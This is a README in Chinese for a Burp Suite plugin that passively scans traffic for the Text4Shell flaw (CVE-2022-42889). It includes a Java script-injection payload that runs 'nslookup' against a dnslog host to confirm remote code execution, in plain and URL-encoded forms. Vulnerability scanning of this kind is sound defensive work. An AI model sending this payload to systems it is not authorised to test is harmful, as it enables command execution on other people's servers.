# BurpText4ShellScan

---

使用java编写的Text4shell burp被动扫描插件

# 简介

---

java maven项目，可以使用`mvn package`进行编译

# 更新

---

```
1.0 - 首次上传，对所有经过burp的包进行被动扫描，扫描对象包括了json、xml、fileupload
1.1 - 修复了body为空时导致的检测错误，修复了对URL参数不检测的错误
1.2 - 修复了body仅有josn与xml时出现的参数构造错误
```

# payload

---

```
- "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup+dns-url%27%29%7D"
- "${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup dns-url')}"
```

可以在`resources/config.yml`修改

# 使用

---

### 0x01 搭建环境

使用github中的[https://github.com/karthikuj/cve-2022-42889-text4shell-docker](https://github.com/karthikuj/cve-2022-42889-text4shell-docker)搭建环境

![image-20221217013031381](https://github.com/A0WaQ4/BurpText4ShellScan/blob/main/img/image-20221217013031381.png)



### 0x02 插件

代理访问`http://yourip:80/text4shell/attack?search=aaa`，开始扫描

在logger中可看见插件发送的包

![image-20221217013353536](https://github.com/A0WaQ4/BurpText4ShellScan/blob/main/img/image-20221217013353536.png)

仅对是否可以dnslog进行扫描，若dnslog接受到请求，则爆出漏洞

![image-20221217013651624](https://github.com/A0WaQ4/BurpText4ShellScan/blob/main/img/image-20221217013651624.png)

![image-20221217013717306](https://github.com/A0WaQ4/BurpText4ShellScan/blob/main/img/image-20221217013717306.png)

### 0x03 配置

在`resources/config.yml`中的`dnsLogModule`修改dnslog配置，使用时可以修改为自搭建的DnsLog服务器

![image-20221217014026078](https://github.com/A0WaQ4/BurpText4ShellScan/blob/main/img/image-20221217014026078.png)



# 参考

---

[https://github.com/pmiaowu/BurpFastJsonScan](https://github.com/pmiaowu/BurpFastJsonScan)

[https://github.com/f0ng/log4j2burpscanner](https://github.com/f0ng/log4j2burpscanner)

# 免责声明

---

该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。